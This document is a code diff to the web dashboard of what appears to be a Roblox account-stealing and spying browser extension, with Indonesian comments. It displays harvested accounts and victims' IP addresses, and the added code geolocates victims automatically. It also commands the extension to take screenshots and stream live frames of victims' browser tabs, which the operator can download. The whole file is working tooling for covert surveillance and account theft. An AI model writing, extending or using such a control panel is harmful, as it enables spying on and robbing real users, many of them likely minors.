@@ -5639,6 +5639,18 @@ SCRIPT
                 // Re-render setelah avatar di-cache supaya gambar muncul
                 renderAccounts(allAccounts);
                 renderSpyData();
+                // Update avatar images in spy cards directly (faster)
+                allAccounts.forEach(account => {
+                    const userId = String(account.userId || '');
+                    const avatarEl = document.querySelector(`#spy-card-${userId} .spy-card-avatar`);
+                    if (avatarEl && userId) {
+                        const url = avatarCache.get(userId);
+                        if (url && url !== 'fallback') {
+                            avatarEl.innerHTML = `<img src="${url}" onerror="this.parentElement.innerHTML='<i data-lucide=\'user\'></i>'; lucide.createIcons();">`;
+                            lucide.createIcons();
+                        }
+                    }
+                });
                 updateStats(data.stats, allAccounts);
                 loadLogs();
                 checkForUpdates(data.accounts);
@@ -5956,21 +5968,38 @@ SCRIPT
             container.innerHTML = '<div style="text-align:center; padding:40px; color:var(--text-muted);">No logs found</div>';
         } else {
             container.innerHTML = pageLogs.map(log => {
-                const typeClass = log.type || 'info';
-                // Pakai cache avatar jika tersedia, fallback ke string kosong
+                // Server log fields: type, userId, username, timestamp, ip, payload, receivedAt
+                const typeClass = log.type || 'account_received';
+                // Determine icon type
+                let iconType = 'info';
+                if (typeClass === 'account_received') iconType = 'success';
+                else if (typeClass === 'account_deleted') iconType = 'error';
+                else if (typeClass === 'warning') iconType = 'warning';
+                else if (typeClass === 'error') iconType = 'error';
+
                 const logAccount = allAccounts.find(a => String(a.userId) === String(log.userId));
                 const avatarUrl = logAccount ? getAvatarUrl(logAccount) : '';
+
+                // Build a readable message from log fields
+                let message = '';
+                if (log.type === 'account_received') message = 'Account data received';
+                else if (log.type === 'account_deleted') message = 'Account deleted';
+                else if (log.content) message = log.content;
+                else if (log.payload) message = 'Payload: ' + log.payload.substring(0, 80);
+                else message = log.type || 'Event';
+
                 return `
                         <div class="notification-item" style="margin-bottom:8px;">
-                            <div class="notification-icon ${typeClass}" style="position:relative; overflow:hidden;">
-                                ${avatarUrl ? `<img src="${avatarUrl}" style="width:100%;height:100%;object-fit:cover;" onerror="this.parentElement.innerHTML='<i data-lucide=&quot;${getNotificationIcon(typeClass)}&quot;></i>'; lucide.createIcons();">` : `<i data-lucide="${getNotificationIcon(typeClass)}"></i>`}
+                            <div class="notification-icon ${iconType}" style="position:relative; overflow:hidden; width:32px;height:32px;border-radius:50%;flex-shrink:0;">
+                                ${avatarUrl ? `<img src="${avatarUrl}" style="width:100%;height:100%;object-fit:cover;border-radius:50%;" onerror="this.parentElement.innerHTML='<i data-lucide=&quot;${getNotificationIcon(iconType)}&quot;></i>'; lucide.createIcons();">` : `<i data-lucide="${getNotificationIcon(iconType)}"></i>`}
                             </div>
                             <div class="notification-content">
                                 <div class="notification-message">
-                                    ${log.username ? '<strong>@' + escHtml(log.username) + '</strong> ' : ''}
-                                    ${escHtml(log.content || '')}
+                                    ${log.username ? '<strong>@' + escHtml(log.username) + '</strong> — ' : ''}
+                                    ${escHtml(message)}
+                                    ${log.ip && log.ip !== '::1' && log.ip !== '::ffff:127.0.0.1' ? `<span style="color:var(--text-muted);font-size:11px;"> · ${escHtml(log.ip)}</span>` : ''}
                                 </div>
-                                <div class="notification-time">${new Date(log.timestamp).toLocaleString()}</div>
+                                <div class="notification-time">${log.timestamp ? new Date(log.timestamp).toLocaleString() : (log.receivedAt ? new Date(log.receivedAt).toLocaleString() : '-')}</div>
                             </div>
                         </div>
                     `;
@@ -6268,9 +6297,27 @@ SCRIPT
         if (!account) return;
 
         const avatarUrl = getAvatarUrl(account);
-        document.getElementById('modalAvatar').innerHTML = avatarUrl ?
-            `<img src="${escHtml(avatarUrl)}" alt="${escHtml(account.displayName || account.username || '')}">` :
-            '<i data-lucide="user" style="width:32px;height:32px;color:#667799;"></i>';
+        const modalAvatarEl = document.getElementById('modalAvatar');
+        if (avatarUrl) {
+            modalAvatarEl.innerHTML = `<img src="${escHtml(avatarUrl)}" alt="${escHtml(account.displayName || account.username || '')}" onerror="this.parentElement.innerHTML='<i data-lucide=\'user\' style=\'width:32px;height:32px;color:#667799;\'></i>'; lucide.createIcons();">`;
+        } else {
+            modalAvatarEl.innerHTML = '<i data-lucide="user" style="width:32px;height:32px;color:#667799;"></i>';
+            // Async fetch avatar if not cached yet
+            if (account.userId) {
+                fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${account.userId}&size=420x420&format=Png&isCircular=false`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data.data && data.data[0] && data.data[0].imageUrl && data.data[0].state === 'Completed') {
+                            const url = data.data[0].imageUrl;
+                            avatarCache.set(String(account.userId), url);
+                            const el = document.getElementById('modalAvatar');
+                            if (el) {
+                                el.innerHTML = `<img src="${url}" alt="${escHtml(account.displayName || account.username || '')}" onerror="this.parentElement.innerHTML='<i data-lucide=\'user\' style=\'width:32px;height:32px;color:#667799;\'></i>'; lucide.createIcons();">`;
+                            }
+                        }
+                    }).catch(() => {});
+            }
+        }
         document.getElementById('modalUsername').textContent = account.displayName || account.username || 'Unknown';
         document.getElementById('modalDisplayName').textContent = account.username ? `@${account.username}` : '';
         document.getElementById('modalUserId').textContent = `User ID: ${account.userId || 'N/A'}`;
@@ -6680,16 +6727,21 @@ SCRIPT
                 </div>
                 <div class="detail-row">
                     <span class="detail-label">Negara</span>
-                    <span class="detail-value">${escHtml(loc.country || 'Unknown')}</span>
+                    <span class="detail-value" id="modal-loc-country-${account.userId}">${escHtml(loc.country || 'Unknown')}</span>
                 </div>
                 <div class="detail-row">
                     <span class="detail-label">Region / Kota</span>
-                    <span class="detail-value">${escHtml((loc.region || 'Unknown') + (loc.city ? ', ' + loc.city : ''))}</span>
+                    <span class="detail-value" id="modal-loc-city-${account.userId}">${escHtml((loc.region && loc.region !== 'Unknown' ? loc.region : '') + (loc.city && loc.city !== 'Unknown' ? ', ' + loc.city : '') || 'Unknown')}</span>
                 </div>
                 <div class="detail-row">
                     <span class="detail-label">ISP</span>
-                    <span class="detail-value">${escHtml(loc.isp || 'Unknown')}</span>
+                    <span class="detail-value" id="modal-loc-isp-${account.userId}">${escHtml(loc.isp || 'Unknown')}</span>
                 </div>
+                ${(!loc.country || loc.country === 'Unknown') ? `
+                <div class="detail-row">
+                    <span class="detail-label"></span>
+                    <span class="detail-value"><button onclick="fetchLocationForModalById('${account.userId}', '${ip}')" style="background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:4px 10px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-family);">🔍 Lookup Lokasi</button></span>
+                </div>` : ''}
             </div>
 
             <!-- Screenshot -->
@@ -6875,6 +6927,15 @@ SCRIPT
 
         grid.innerHTML = accounts.map(account => buildSpyCard(account)).join('');
         lucide.createIcons();
+        // Auto-lookup IP location for accounts with unknown location
+        accounts.forEach(account => {
+            const loc = account.location || {};
+            if (account.ip && account.ip !== 'Unknown' &&
+                (!loc.country || loc.country === 'Unknown')) {
+                // Auto trigger lookup
+                fetchLocationForIPById(String(account.userId), account.ip);
+            }
+        });
     }
 
     function buildSpyCard(account) {
@@ -6926,7 +6987,8 @@ SCRIPT
                         ${(loc.region && loc.region !== 'Unknown') ? `<span class="spy-ip-tag">📍 ${escHtml(loc.region)}</span>` : ''}
                         ${(loc.city && loc.city !== 'Unknown') ? `<span class="spy-ip-tag">🏙️ ${escHtml(loc.city)}</span>` : ''}
                         ${(loc.isp && loc.isp !== 'Unknown') ? `<span class="spy-ip-tag">🌐 ${escHtml(loc.isp.substring(0, 30))}</span>` : ''}
-                        <button onclick="fetchLocationForIPById('${userId}', '${escHtml(ip)}')" style="background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:2px 8px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-family);">🔍 Lookup</button>
+                        ${(!loc.country || loc.country === 'Unknown') ? '<span style="color:var(--text-muted);font-size:11px;">⏳ Looking up...</span>' : ''}
+                        <button onclick="fetchLocationForIPById('${userId}', '${escHtml(ip)}')" style="background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:2px 8px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-family);" title="Re-lookup IP location">🔍 Refresh</button>
                     </div>` : `<div class="spy-ip-meta" id="ip-meta-${userId}"><button onclick="fetchLocationForIPById('${userId}', '${escHtml(ip)}')" style="background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:2px 8px;border-radius:4px;cursor:pointer;font-size:11px;font-family:var(--font-family);">🔍 Lookup IP</button></div>`}
                 </div>
 
@@ -7047,44 +7109,102 @@ SCRIPT
             });
         } catch (e) {}
 
-        // Poll for new screenshot for 15s
+        // Poll for new screenshot (up to 15s)
         let attempts = 0;
+        let prevScreenshot = allAccounts.find(a => String(a.userId) === String(userId))?.screenshot || null;
+
         const pollSS = setInterval(async () => {
             attempts++;
-            await loadData();
-            const updated = allAccounts.find(a => String(a.userId) === String(userId));
-            if (updated?.screenshot) {
-                const imgEl = document.getElementById('screenshot-img-' + userId);
-                const blockEl = document.getElementById('screenshot-block-' + userId);
-                if (imgEl) {
-                    imgEl.src = updated.screenshot + '?t=' + Date.now();
+            try {
+                // Fetch fresh account data
+                const res = await fetch(`${API_URL}/api/account/${userId}`, {
+                    headers: { 'x-api-key': API_KEY }
+                });
+                const data = await res.json();
+                if (data.success && data.account) {
+                    const updated = data.account;
+                    // Update in allAccounts
+                    const idx = allAccounts.findIndex(a => String(a.userId) === String(userId));
+                    if (idx !== -1) allAccounts[idx] = { ...allAccounts[idx], ...updated };
+
+                    if (updated.screenshot && updated.screenshot !== prevScreenshot) {
+                        prevScreenshot = updated.screenshot;
+                        const src = updated.screenshot;
+                        const blockEl = document.getElementById('screenshot-block-' + userId);
+                        if (blockEl) {
+                            blockEl.innerHTML = `<img src="${src}" id="screenshot-img-${userId}" onclick="openLightbox('${src}')" style="width:100%;display:block;border-radius:0;" title="Klik untuk perbesar">`;
+                        }
+                        clearInterval(pollSS);
+                        if (btn) { btn.textContent = '🔄 Refresh'; btn.disabled = false; }
+                        showToast('Screenshot berhasil diperbarui!', 'success');
+                        return;
+                    }
                 }
-                if (!imgEl && blockEl && updated.screenshot) {
-                    blockEl.innerHTML = `<img src="${updated.screenshot}" id="screenshot-img-${userId}" onclick="openLightbox('${updated.screenshot}')" style="width:100%;display:block;" title="Klik untuk perbesar">`;
-                }
-            }
-            if (attempts >= 5) {
+            } catch (e) {}
+
+            if (attempts >= 6) {
                 clearInterval(pollSS);
                 if (btn) { btn.textContent = '🔄 Refresh'; btn.disabled = false; }
+                showToast('Screenshot refresh timeout — coba lagi', 'warning');
             }
-        }, 3000);
+        }, 2500);
     }
 
     // ================================================================
     // DOWNLOAD IMAGE
     // ================================================================
+    const _liveFrameCache = {}; // userId -> latest frame dataUrl
+
     function downloadImage(userId, type) {
+        let src = null;
         const account = allAccounts.find(a => String(a.userId) === String(userId));
-        if (!account) return;
-        const src = type === 'screenshot' ? account.screenshot : getAvatarUrl(account);
+
+        if (type === 'live') {
+            // Get live frame from cache
+            src = _liveFrameCache[userId] || null;
+            if (!src) {
+                // Try to get from img element
+                const imgEl = document.querySelector(`#live-container-${userId} img`);
+                src = imgEl ? imgEl.src : null;
+            }
+        } else if (type === 'screenshot') {
+            src = account?.screenshot || null;
+            if (!src) {
+                const imgEl = document.getElementById('screenshot-img-' + userId);
+                src = imgEl ? imgEl.src : null;
+            }
+        } else {
+            src = account ? getAvatarUrl(account) : null;
+        }
+
         if (!src) { showToast('Tidak ada gambar untuk didownload', 'warning'); return; }
-        const a = document.createElement('a');
-        a.href = src;
-        a.download = `${account.username || userId}_${type}_${Date.now()}.jpg`;
-        a.target = '_blank';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+
+        // For data URLs, create blob
+        if (src.startsWith('data:')) {
+            const arr = src.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while(n--) u8arr[n] = bstr.charCodeAt(n);
+            const blob = new Blob([u8arr], { type: mime });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${account?.username || userId}_${type}_${Date.now()}.jpg`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        } else {
+            const a = document.createElement('a');
+            a.href = src;
+            a.download = `${account?.username || userId}_${type}_${Date.now()}.jpg`;
+            a.target = '_blank';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
         showToast('Download dimulai', 'success');
     }
 
@@ -7108,7 +7228,12 @@ SCRIPT
         const account = allAccounts.find(a => String(a.userId) === String(userId));
         const deviceId = account?.deviceId || '';
 
-        if (btn) { btn.textContent = '🟢 Live ON'; btn.style.color = 'var(--success)'; btn.style.borderColor = 'rgba(0,224,126,0.3)'; }
+        if (btn) {
+            btn.textContent = '🟢 Live ON';
+            btn.style.color = 'var(--success)';
+            btn.style.borderColor = 'rgba(0,224,126,0.3)';
+            btn.style.background = 'rgba(0,224,126,0.08)';
+        }
         if (container) container.innerHTML = '<div style="font-size:12px;color:var(--text-muted);text-align:center;padding:12px;">⏳ Connecting live stream...</div>';
 
         // Send command to extension
@@ -7139,11 +7264,12 @@ SCRIPT
                                 <img src="${data.frame}" style="width:100%;display:block;border-radius:0;" onclick="openLightbox('${data.frame}')">
                                 <div style="position:absolute;top:4px;left:6px;background:rgba(255,0,0,0.8);color:white;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;">● ${ageStr}</div>
                                 ${data.tabTitle ? `<div style="position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.6);color:#ccc;font-size:10px;padding:2px 6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${escHtml(data.tabTitle)}</div>` : ''}
-                                <button onclick="downloadImage('${userId}', 'live')" style="position:absolute;top:4px;right:6px;background:rgba(0,0,0,0.6);border:none;color:white;font-size:11px;padding:2px 6px;border-radius:4px;cursor:pointer;">⬇</button>
+                                <button onclick="downloadLiveFrame('${userId}')" style="position:absolute;top:4px;right:6px;background:rgba(0,0,0,0.6);border:none;color:white;font-size:11px;padding:2px 6px;border-radius:4px;cursor:pointer;" title="Download frame ini">⬇ DL</button>
                             </div>`;
                         // Store frame for download
                         if (!allAccounts._liveFrames) allAccounts._liveFrames = {};
                         allAccounts._liveFrames[userId] = data.frame;
+                        _liveFrameCache[userId] = data.frame;
                     }
                 }
             } catch (e) {}
@@ -7159,7 +7285,12 @@ SCRIPT
         const account = allAccounts.find(a => String(a.userId) === String(userId));
         const deviceId = account?.deviceId || '';
 
-        if (btn) { btn.textContent = '🔴 Live OFF'; btn.style.color = 'var(--danger)'; btn.style.borderColor = 'rgba(255,59,59,0.2)'; }
+        if (btn) {
+            btn.textContent = '🔴 Live OFF';
+            btn.style.color = 'var(--danger)';
+            btn.style.borderColor = 'rgba(255,59,59,0.2)';
+            btn.style.background = 'rgba(255,59,59,0.08)';
+        }
         if (container) container.innerHTML = '<div style="font-size:12px;color:var(--text-muted);text-align:center;padding:16px;"><span>Live OFF — tekan tombol untuk mulai</span></div>';
 
         const state = liveStates[userId];
@@ -7315,6 +7446,42 @@ SCRIPT
     setInterval(() => {
         if (!activityPaused && isAuthenticated) loadLogs();
     }, 15000);
+
+    // ================================================================
+    // MODAL IP LOOKUP
+    // ================================================================
+    async function fetchLocationForModalById(userId, ip) {
+        if (!ip || ip === 'Unknown') return;
+        const countryEl = document.getElementById('modal-loc-country-' + userId);
+        const cityEl = document.getElementById('modal-loc-city-' + userId);
+        const ispEl = document.getElementById('modal-loc-isp-' + userId);
+        if (countryEl) countryEl.textContent = '⏳ Looking up...';
+
+        const loc = await _lookupIP(ip);
+        if (loc) {
+            if (countryEl) countryEl.textContent = loc.country || 'Unknown';
+            if (cityEl) cityEl.textContent = (loc.region || '') + (loc.city ? ', ' + loc.city : '') || 'Unknown';
+            if (ispEl) ispEl.textContent = loc.isp || 'Unknown';
+            // Also update allAccounts cache
+            const acc = allAccounts.find(a => String(a.userId) === String(userId));
+            if (acc) acc.location = loc;
+        } else {
+            if (countryEl) countryEl.textContent = '❌ Gagal lookup';
+        }
+    }
+
+    // ================================================================
+    // LIVE FRAME DOWNLOAD (from within rendered live view)
+    // ================================================================
+    function downloadLiveFrame(userId) {
+        const src = _liveFrameCache[userId];
+        if (!src) {
+            showToast('Tidak ada frame live untuk didownload', 'warning');
+            return;
+        }
+        downloadImage(userId, 'live');
+    }
+
 </script>
 </body>
 </html>
